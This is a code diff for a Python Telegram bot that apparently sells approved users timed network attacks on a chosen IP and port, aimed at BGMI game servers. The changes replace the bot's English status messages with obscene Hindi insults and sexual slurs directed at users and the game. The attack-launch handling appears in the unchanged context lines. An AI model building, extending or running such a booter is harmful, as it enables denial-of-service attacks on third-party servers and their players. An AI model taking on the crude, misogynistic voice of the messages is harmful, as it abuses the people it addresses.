@@ -135,10 +135,10 @@ def approve_or_disapprove_user(message):
             {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
             upsert=True
         )
-        msg_text = (f"*🎉 Congratulations!*\n"
+        msg_text = (f"*💫OP BHAI ✨!*\n"
                     f"*User {target_user_id} has been approved!*\n"
                     f"*Plan: {plan} for {days} days!*\n"
-                    f"*Welcome to our community! Let’s make some magic happen! ✨*")
+                    f"*AB TUM BHI BGMI KI RANDI MAA KO CHODO 🥵✨*")
     else:  # disapprove
         users_collection.update_one(
             {"user_id": target_user_id},
@@ -168,8 +168,8 @@ def handle_attack_command(message):
     try:
         user_data = users_collection.find_one({"user_id": user_id})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
-                                       "*You need to be approved to use this bot.*\n"  # Need approval message
+            bot.send_message(chat_id, "*🔮LODA LELE MADHARCHOD 🥵!*\n"  # Access Denied message
+                                       "*🔮PHLE RAAJ PAPA SE PERMISSION LE TAB WORK KAREGE🎭*\n"  # Need approval message
                                        "*Contact the owner for assistance: @drabbyt.*", parse_mode='T34M_CODEX')  # Contact owner message
             return
 
@@ -185,15 +185,15 @@ def handle_attack_command(message):
             return
 
         if bot.attack_in_progress:
-            bot.send_message(chat_id, "*⚠️ Please wait!*\n"  # Busy message
-                                       "*The bot is busy with another attack.*\n"  # Current attack message
-                                       "*Check remaining time with the /when command.*", parse_mode='T34M_CODEX')  # Check remaining time
+            bot.send_message(chat_id, "*🪩PLEASE WAIT...💫*\n"  # Busy message
+                                       "*🔮RUK JA BETICHOD KAHI OR ATTACK LAG RHA HAI*\n"  # Current attack message
+                                       "*🔮CHECK KARLE KITNA TIME PHLE ATTACK MARA HAI /when CAMMAAND🎭*", parse_mode='T34M_CODEX')  # Check remaining time
             return
 
-        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"  # Ready to launch message
-                                   "*Please provide the target IP, port, and duration in seconds.*\n"  # Provide details message
-                                   "*Example: 167.67.25 6296 60* 🔥\n"  # Example message
-                                   "*Let the chaos begin! 🎉*", parse_mode='T34M_CODEX')  # Start chaos message
+        bot.send_message(chat_id, "*🔮MAI READY HU SIR ✨*\n"  # Ready to launch message
+                                   "*💫 IP,POET, TIME 💫.*\n"  # Provide details message
+                                   "*🔮ESE DALO SIR: 167.67.25 6296 60* 🔥\n"  # Example message
+                                   "*🔮CHALO GAND MARTE HAI BGMI KI!*", parse_mode='T34M_CODEX')  # Start chaos message
         bot.register_next_step_handler(message, process_attack_command)
 
     except Exception as e:
@@ -203,15 +203,15 @@ def process_attack_command(message):
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, "*❗ Error!*\n"  # Error message
-                                               "*Please use the correct format and try again.*\n"  # Correct format message
-                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='T34M_CODEX')  # Three inputs message
+            bot.send_message(message.chat.id, "*❗ ERROR...!*\n"  # Error message
+                                               "*🔮GALTI KAHE DAL RHA HAI RANDI SHI SE DALO NA.*\n"  # Correct format message
+                                               "*🔮IP,PORT,TIME, SHI SE DALO BETICHOD 🎭*", parse_mode='T34M_CODEX')  # Three inputs message
             return
 
         target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
 
         if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"  # Blocked port message
+            bot.send_message(message.chat.id, f"*🔒 PORT {target_port} BLOCKED HAI BETA.*\n"  # Blocked port message
                                                "*Please select a different port to proceed.*", parse_mode='T34M_CODEX')  # Different port message
             return
         if duration >= 600:
@@ -225,10 +225,10 @@ def process_attack_command(message):
 
         # Start the attack
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  # Attack launched message
-                                           f"*📡 Target Host: {target_ip}*\n"  # Target host message
-                                           f"*👉 Target Port: {target_port}*\n"  # Target port message
-                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='T34M_CODEX')  # Duration message
+        bot.send_message(message.chat.id, f"*🚀 BGMI KI GAND MARLI ! 🚀*\n\n"  # Attack launched message
+                                           f"*🔮 IP ADRESS: {target_ip}*\n"  # Target host message
+                                           f"*🔮IP PORT: {target_port}*\n"  # Target port message
+                                           f"*🔮TIME: {duration} seconds...*", parse_mode='T34M_CODEX')  # Duration message
 
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
@@ -249,8 +249,8 @@ def when_command(message):
         remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time
 
         if remaining_time > 0:
-            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
-                                       "*🔍 Hold tight, the action is still unfolding!*\n"
+            bot.send_message(chat_id, f"*⏳ITNA TIME RUKJA BETICHOD: {int(remaining_time)} seconds...*\n"
+                                       "*🔮BEECH ME KUCH BACKCHODI KIYA TO GANE CRUSHED KAR DUNGA!*\n"
                                        "*💪 Stay tuned for updates!*", parse_mode='T34M_CODEX')
         else:
             bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
